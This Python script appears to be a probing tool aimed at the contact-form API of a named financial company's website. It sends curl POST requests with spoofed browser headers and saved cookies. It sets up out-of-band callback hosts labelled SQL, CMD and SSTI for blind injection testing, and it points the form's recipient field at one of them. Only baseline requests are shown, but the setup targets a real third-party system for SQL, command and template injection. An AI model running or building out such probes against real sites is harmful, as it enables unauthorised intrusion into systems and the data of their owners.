import sys, time, urllib.parse, subprocess, json

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
URL="https://www.infinitycapital.bh/api/send"
SQL="oobc89d063515a3.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
CMD="oob7c0012d863a5.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
SSTI="oobc49211283114.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
RCPT=SQL

def post(fields, label, extra_hdrs=None, delay=3.0):
    data=urllib.parse.urlencode(fields)
    cmd=["curl","-s","-X","POST",URL,
         "-A",UA,"-H","Content-Type: application/x-www-form-urlencoded",
         "-H","Accept: */*","-H","Origin: https://www.infinitycapital.bh",
         "-H","Referer: https://www.infinitycapital.bh/contact",
         "-b","/work/cookies.txt","-c","/work/cookies.txt",
         "-w","\n@@%{http_code}@@%{size_download}@@%{time_total}",
         "--data",data]
    if extra_hdrs:
        for k,v in extra_hdrs.items():
            cmd[1:1]=["-H",f"{k}: {v}"]
    t=time.time()
    r=subprocess.run(cmd,capture_output=True,text=True,timeout=60)
    el=time.time()-t
    out=r.stdout
    marker="@@"
    parts=out.rsplit("\n"+marker,1)
    body=parts[0]
    meta=parts[1].strip("@") if len(parts)>1 else "?"
    f=meta.split("@@")
    code=f[0] if len(f)>0 else "?"
    size=f[1] if len(f)>1 else "?"
    tt=f[2] if len(f)>2 else "?"
    tag="OK" if code=="200" else ("RATE" if code in ("429","403") else code)
    print(f"{label:38s} HTTP {code:4s} len={size:5s} tt={tt} wall={el:.2f} -> {tag}  {body[:90]!r}")
    return {"code":code,"body":body,"size":size,"tt":tt}

def base(**over):
    d={"fname":"QA","lname":"Probe","areacode":"973","tel":"5551234",
       "cname":"QA Tester","subject":"SecTest","msg":"body text","check":"on",
       "targets":RCPT}
    d.update(over)
    return d

if __name__=="__main__":
    which=sys.argv[1] if len(sys.argv)>1 else "probe"
    if which=="baseline":
        post(base(),"baseline no none")
        time.sleep(5)
        post(base(none="1"),"none=1")
        time.sleep(5)
        post(base(none=""),"none= (empty)")
